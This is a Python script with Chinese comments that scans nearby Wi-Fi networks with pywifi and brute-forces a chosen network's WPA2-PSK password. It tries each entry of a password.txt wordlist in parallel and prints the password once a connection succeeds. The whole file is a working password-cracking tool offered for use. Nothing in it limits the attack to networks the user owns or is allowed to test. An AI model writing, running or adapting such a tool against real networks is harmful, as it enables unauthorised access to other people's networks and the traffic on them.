from pywifi import PyWiFi, const, Profile  # 从pywifi模块导入必要的类
import time  # 导入time模块用于睡眠功能
from multiprocessing import Pool, Manager, Lock  # 导入多进程池、Manager和Lock

def search_wifi():
    """
    扫描wifi,并返回wifi列表。
    """
    wifi = PyWiFi()  # 创建一个PyWiFi对象
    ifaces = wifi.interfaces()[0]  # 获取第一个无线接口
    ifaces.scan()  # 开始扫描可用的Wi-Fi网络
    time.sleep(1)  # 等待1秒以便扫描完成
    results = ifaces.scan_results()  # 获取扫描结果
    wifi_lists = []  # 初始化一个空列表来存储SSID
    for index, network in enumerate(results):  # 遍历扫描结果
        network.signal+=100 # 给每一个信号强度一个大于0的整数，显示信号的强弱。
        print(f"{index}: SSID: {network.ssid}, 信号强度: {network.signal}")  # 打印索引、SSID和信号强度
        wifi_lists.append(network.ssid)  # 将SSID添加到列表中
        with open("ssid.txt", "a", encoding="utf-8") as f:  # 以追加模式打开ssid.txt文件，使用UTF-8编码
            f.write(network.ssid + "\n")  # 将SSID写入文件
    return wifi_lists  # 返回SSID列表

def connect_to_wifi(ssid, password, lock):
    """
    尝试使用提供的SSID和密码连接到Wi-Fi网络。
    如果连接成功则返回True，否则返回False。
    """
    wifi = PyWiFi()  # 创建一个PyWiFi对象
    ifaces = wifi.interfaces()[0]  # 获取第一个无线接口
    time.sleep(1)  # 等待1秒

    with lock:  # Ensure only one process checks and connects at a time
        if ifaces.status() not in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
            print("接口未准备好连接。请断开当前网络连接。")
            return False  # 如果接口未准备好则返回False

        profile = Profile()  # 创建一个新的Profile对象
        profile.ssid = ssid  # 设置配置文件的SSID
        profile.auth = const.AUTH_ALG_OPEN  # 设置认证算法为开放
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 设置密钥管理类型为WPA2-PSK
        profile.cipher = const.CIPHER_TYPE_CCMP  # 设置加密类型为CCMP
        profile.key = password  # 设置配置文件的密码

        ifaces.remove_all_network_profiles()  # 移除所有现有的网络配置文件
        tmp_profile = ifaces.add_network_profile(profile)  # 将新配置文件添加到接口

        ifaces.connect(tmp_profile)  # 尝试使用新配置文件连接
        time.sleep(1)  # 增加等待时间以便连接建立

        # 检查接口是否已连接
        if ifaces.status() == const.IFACE_CONNECTED:
            print("成功连接")  # 打印成功消息
            return True  # 如果已连接则返回True
        else:
            print("连接失败")  # 打印失败消息
            return False  # 如果未连接则返回False

def try_password(args):
    """
    尝试使用给定的密码连接到指定的SSID。
    """
    ssid, password, success_flag, lock = args
    if success_flag.value:
        return False
    if connect_to_wifi(ssid, password, lock):
        print(f"[*] 密码已经破解完毕：{password}")  # 打印成功消息和破解的密码
        success_flag.value = True
        return True
    else:
        print(f"正在破解ssid 为{ssid} 的wifi密码：当前校验密码是：{password}")
        return False

def try_pwd():
    """
    列出可用的Wi-Fi网络，允许用户通过编号选择一个，
    并尝试使用'password.txt'中的密码列表破解密码。
    """
    wifi_lists = search_wifi()  # 调用scan_wifi获取可用SSID列表
    print("----------wifi 破解中-----------")  # 打印消息指示破解过程开始
    if not wifi_lists:  # 检查是否未找到Wi-Fi网络
        print("未找到Wi-Fi网络。")  # 如果未找到网络则打印消息
        return  # 退出函数

    try:
        # 提示用户输入要破解的Wi-Fi网络编号
        choice = int(input("输入要破解的Wi-Fi网络编号: "))
        ssid = wifi_lists[choice]  # 获取与用户选择对应的SSID
    except (ValueError, IndexError):  # 处理无效输入或索引错误
        print("无效选择。请输入有效编号。")  # 打印错误消息
        return  # 退出函数

    path = "password.txt"  # 定义密码文件的路径
    with open(path, "r") as file:  # 以读模式打开密码文件
        passwords = [pwd.strip() for pwd in file]  # 去除每个密码的前后空白

    manager = Manager()
    success_flag = manager.Value('b', False)
    lock = manager.Lock()  # Create a lock for synchronizing access

    # 使用多进程池来并行尝试密码
    with Pool(processes=4) as pool:  # 创建一个包含4个进程的进程池
        results = pool.map(try_password, [(ssid, pwd, success_flag, lock) for pwd in passwords])  # 并行执行密码尝试

    if any(results):  # 如果有任何一个结果为True
        print("------------------------------------------------------")
        print("[*] 破解成功")  # 打印成功消息
    else:
        print("[*] 破解失败")  # 打印失败消息

if __name__ == "__main__":  # 检查脚本是否被直接运行
    try_pwd()  # 调用try_pwd函数开始过程
